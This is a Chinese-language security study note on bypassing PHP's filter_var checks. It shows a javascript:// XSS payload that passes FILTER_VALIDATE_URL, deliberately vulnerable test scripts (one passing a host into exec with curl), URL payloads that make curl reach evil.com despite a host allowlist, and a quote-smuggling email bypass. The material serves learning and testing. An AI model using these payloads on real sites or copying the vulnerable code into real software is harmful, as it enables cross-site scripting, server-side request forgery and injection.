# filter_var

**函数结构：**

```
filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed
```
## FILTER_VALIDATE_URL
**参考：**

- https://secure.php.net/manual/zh/function.filter-var.php
- https://www.anquanke.com/post/id/101058

### 利用

#### javascript

```php
filter_var('javascript://comment%250Aalert(1)', FILTER_VALIDATE_URL);
```

上述代码可能会导致XSS攻击。

因为`//`在JavaScript中表示单行注释，`%250a`解码后为换行符，所以`alert(1)`和`//`不在一行，js代码成功执行。

**测试代码**

```php
<?php
$url = filter_var($_GET['url'],FILTER_VALIDATE_URL);
var_dump($url);
$url=htmlspecialchars($url);
var_dump($url);
echo "<a href='$url'>Next slide </a>";
```

![1563864262526](/images/19-7-23_PHP_filter-var_filter-validate-url_1.png)

#### curl

**利用条件**

- curl<=7.47.0（win下7.55.1不可用）

在如下脚本中：

```php
<?php
   $url = $_GET['url'];
   echo "Argument: ".$url."\n";
   if(filter_var($url, FILTER_VALIDATE_URL)) {
      $r = parse_url($url);
      var_dump($r);
      if(preg_match('/skysec\.top$/', $r['host'])) {
          echo 'start curl';
         exec('curl -v -s "'.$r['host'].'"', $a);
      } else {
         echo "Error: Host not allowed";
      }
   } else {
      echo "Error: Invalid URL";
   }
?>
```
可用payload：
```url
访问evil.com:2333
?url=0://evil.com:23333;skysec.top:80/
访问evil.top
?url=0://evil.com$skysec.top
访问evil.com:80
?url=0://evil.com:80$skysec.top
```



### FILTER_VALIDATE_EMAIL
参考：
- https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html#0x03-filter_validate_email
- https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly

绕过方法为：`"Joe'Blow"@example.com`，逃逸了单引号。
```php
<?php
$email = '"Joe\'Blow"@example.com';
if (filter_var($email, FILTER_VALIDATE_EMAIL))
        var_dump(filter_var($email, FILTER_VALIDATE_EMAIL));
else
        echo "email not correct";

//C:\Users\j7ur8\Desktop\test.php:4:string(22) ""Joe'Blow"@example.com"
?>
```
